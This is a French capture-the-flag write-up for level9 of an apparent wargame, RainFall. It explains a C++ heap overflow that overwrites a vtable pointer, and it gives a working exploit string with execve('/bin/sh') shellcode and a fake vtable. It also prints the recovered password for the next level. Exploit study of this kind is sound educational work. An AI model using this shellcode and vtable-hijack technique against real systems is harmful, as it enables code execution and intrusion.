# level9: Exploitation du Vtable en C++

## Aperçu du Défi

Ce défi présente un programme C++ qui utilise des concepts de programmation orientée objet comme les fonctions virtuelles et la gestion de la mémoire. L'objectif est d'exploiter une vulnérabilité de type buffer overflow en tirant parti du mécanisme de vtable du C++.

## Analyse du Code Source

Le programme est une application C++ basique qui définit une classe `N` avec une fonction virtuelle:

```cpp
class N {
public:
    // Le constructeur initialise un objet avec une valeur
    N(int value) {
        *(void ***)this = &vtable;
        *(int *)((char *)this + 104) = value;
    }

    // Copie une chaîne dans un buffer interne - fonction vulnérable!
    void setAnnotation(char *str) {
        size_t len = strlen(str);
        memcpy((char *)this + 4, str, len);
    }

    // Fonction virtuelle qui additionne les valeurs de deux objets
    virtual int operator+(N *other) {
        int myValue = this->getValue();
        int otherValue = other->getValue();
        return otherValue + myValue;
    }

    int getValue() {
        return *(int *)((char *)this + 104);
    }

private:
    // Organisation de la mémoire:
    // Octets 0-3:   pointeur de vtable
    // Octets 4-103: buffer pour l'annotation
    // Octets 104-107: valeur entière
    static void *vtable;
};
```

La fonction `main()` crée deux objets et appelle la fonction virtuelle:

```cpp
int main(int argc, char **argv) {
    if (argc < 2) {
        _exit(1);
    }

    N *obj1 = new N(5);  // Premier objet avec la valeur 5
    N *obj2 = new N(6);  // Second objet avec la valeur 6

    obj1->setAnnotation(argv[1]);  // Copie l'entrée utilisateur dans obj1

    obj2->operator+(obj1);  // Appelle la fonction virtuelle sur obj2

    return 0;
}
```

## Vulnérabilité

La vulnérabilité se situe dans la méthode `setAnnotation()`:

```cpp
void setAnnotation(char *str) {
    size_t len = strlen(str);
    memcpy((char *)this + 4, str, len);  // Pas de vérification des limites!
}
```

Cette fonction:

1. Prend une chaîne et mesure sa longueur
2. Copie la chaîne dans un buffer interne commençant à l'offset 4
3. Ne vérifie pas si la chaîne tient dans les 100 octets alloués pour le buffer

Sans vérification des limites, nous pouvons fournir une chaîne de plus de 100 octets, provoquant un buffer overflow qui peut écraser la mémoire adjacente.

## Exploitation

Pour exploiter cette vulnérabilité, nous devons comprendre le mécanisme de vtable en C++:

1. **Organisation de la Mémoire des Objets**:

   - Chaque objet avec des fonctions virtuelles possède un pointeur de vtable au début
   - Le pointeur de vtable pointe vers une table d'adresses de fonctions
   - Quand une fonction virtuelle est appelée, le programme recherche son adresse dans la vtable

2. **Organisation de la Mémoire**:

   - L'analyse GDB montre que obj1 est à l'adresse 0x804a00c
   - obj2 est à l'adresse 0x804a078 (108 octets après obj1)
   - En débordant le buffer de obj1, nous pouvons écraser le pointeur de vtable de obj2

3. **Stratégie d'Exploitation**:
   - Remplir le buffer de obj1 avec notre shellcode
   - Placer un pointeur vers notre shellcode au début de obj1
   - Déborder obj1 pour écraser le pointeur de vtable de obj2, le faisant pointer vers obj1
   - Quand la fonction virtuelle de obj2 est appelée, elle suivra la fausse vtable et exécutera notre shellcode

Grâce au debugging avec GDB, nous avons découvert que:

- obj1 commence à 0x804a00c
- Le buffer de obj1 commence à 0x804a010 (offset de 4 octets)
- Le pointeur de vtable de obj2 est à 0x804a078
- Pour déborder de obj1 à obj2, nous avons besoin d'exactement 108 octets

La clé de compréhension était que nous ne pouvions pas simplement pointer directement vers le shellcode - nous devions créer une structure de "fausse vtable":

1. À l'adresse 0x804a00c: Placer l'adresse 0x804a010 (pointant vers notre shellcode)
2. À l'adresse 0x804a010: Placer notre shellcode
3. Utiliser du padding pour atteindre exactement 108 octets
4. Écraser le pointeur de vtable de obj2 avec 0x804a00c (adresse de notre fausse vtable)

## Obtention du Mot de Passe

Nous avons construit notre chaîne d'exploit comme suit:

```
./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * (108 - 4 - 21) + "\x0c\xa0\x04\x08"')
```

Où:

- `\x10\xa0\x04\x08` est l'adresse de notre shellcode (0x804a010)
- Les 21 octets suivants sont le shellcode pour `execve("/bin/sh")`
- "A" \* (108 - 4 - 21) octets de padding pour atteindre le pointeur de vtable de obj2
- `\x0c\xa0\x04\x08` est l'adresse de obj1 (0x804a00c), notre fausse vtable

Cela nous donne un shell, permettant de récupérer le mot de passe:

```
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

## Passage au Niveau Suivant

Utilisez le mot de passe pour vous connecter à bonus0:

```bash
level9@RainFall:~$ su bonus0
Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
bonus0@RainFall:~$
```
